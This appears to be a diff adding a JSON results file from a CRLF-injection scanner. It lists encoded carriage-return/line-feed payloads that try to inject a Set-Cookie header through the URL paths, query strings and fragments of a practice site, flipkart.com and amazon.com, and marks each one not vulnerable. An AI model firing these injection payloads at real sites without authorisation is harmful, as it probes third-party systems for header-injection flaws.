@@ -1,0 +1,578 @@
+[
+  {
+    "url": "http://practice.expandtesting.com/%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/crlf%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/crlf%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/crlf%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/crlf%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/crlf%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/crlf%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/?crlf=%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/?crlf=%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/?crlf=%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/?crlf=%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/?crlf=%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/?crlf=%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/#%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/#%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/#%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/#%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/#%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://practice.expandtesting.com/#%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/crlf%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/crlf%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/crlf%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/crlf%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/crlf%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/crlf%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/?crlf=%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/?crlf=%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/?crlf=%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/?crlf=%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/?crlf=%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/?crlf=%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/#%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/#%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/#%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/#%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/#%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://practice.expandtesting.com/#%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/crlf%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/crlf%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/crlf%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/crlf%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/crlf%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/crlf%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/?crlf=%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/?crlf=%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/?crlf=%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/?crlf=%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/?crlf=%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/?crlf=%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/#%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/#%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/#%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/#%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/#%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.flipkart.com/#%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/crlf%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/crlf%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/crlf%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/crlf%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/crlf%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/crlf%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/?crlf=%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/?crlf=%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/?crlf=%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/?crlf=%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/?crlf=%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/?crlf=%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/#%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/#%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/#%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/#%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/#%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.flipkart.com/#%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/crlf%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/crlf%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/crlf%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/crlf%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/crlf%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/crlf%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/?crlf=%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/?crlf=%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/?crlf=%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/?crlf=%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/?crlf=%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/?crlf=%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/#%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/#%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/#%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/#%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/#%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "http://www.amazon.com/#%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/crlf%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/crlf%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/crlf%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/crlf%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/crlf%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/crlf%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/?crlf=%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/?crlf=%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/?crlf=%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/?crlf=%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/?crlf=%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/?crlf=%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/#%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/#%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/#%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/#%23%0dSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/#%23%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  },
+  {
+    "url": "https://www.amazon.com/#%23%0d%0aSet-Cookie:param=crlf;",
+    "vulnerable": false
+  }
+]
